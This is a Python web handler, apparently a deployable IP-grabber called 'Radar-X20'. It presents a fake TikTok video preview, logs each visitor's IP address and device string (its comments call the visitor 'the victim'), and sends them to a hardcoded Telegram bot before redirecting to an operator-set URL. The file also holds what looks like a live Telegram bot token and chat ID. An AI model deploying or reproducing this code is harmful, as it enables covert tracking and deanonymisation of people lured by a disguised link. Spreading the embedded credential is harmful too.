from http.server import BaseHTTPRequestHandler
import json
import urllib.request
import urllib.parse

# 🛡️ بيانات البوت الثابت
TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg"
ID = "5811700860"

# مخزن الرابط
class Storage:
    target_url = "https://vt.tiktok.com/"

storage = Storage()

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data)
            storage.target_url = data.get("url", "https://vt.tiktok.com/")
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success"}).encode())
        except:
            self.send_response(500)
            self.end_headers()

    def do_GET(self):
        # 1. سحب بيانات الضحية
        ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
        ua = self.headers.get('User-Agent', 'Unknown')
        
        # 2. إرسال البيانات فوراً لتليجرام باستخدام (بيانات البوت الثابت)
        try:
            report = f"🛰️ **Radar-X20 New Hit!**\n\n🌐 **IP:** `{ip}`\n📱 **Device:** `{ua}`\n🔗 **Redirected to:** {storage.target_url}"
            encoded_text = urllib.parse.quote(report)
            api_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={encoded_text}&parse_mode=Markdown"
            
            # إرسال الطلب مع User-Agent لضمان القبول
            req = urllib.request.Request(api_url, headers={'User-Agent': 'Mozilla/5.0'})
            urllib.request.urlopen(req)
        except Exception as e:
            print(f"Send Error: {e}")

        # 3. عرض صفحة التمويه (MetaData لتيك توك)
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>TikTok Video</title>
            <meta property="og:title" content="TikTok - Watch Video">
            <meta property="og:description" content="شاهد هذا المقطع الممتع">
            <meta property="og:image" content="https://sf16-scmcdn-sg.ibytedtos.com/obj/eden-sg/uufs_om_lp/ljhwZ_lp/2021/tiktok_og_image.png">
            <meta property="og:type" content="video.other">
            <meta name="twitter:card" content="summary_large_image">
            <script>
                setTimeout(function() {{
                    window.location.replace("{storage.target_url}");
                }}, 400);
            </script>
        </head>
        <body style="background:black;"></body>
        </html>
        """
        self.wfile.write(html.encode())
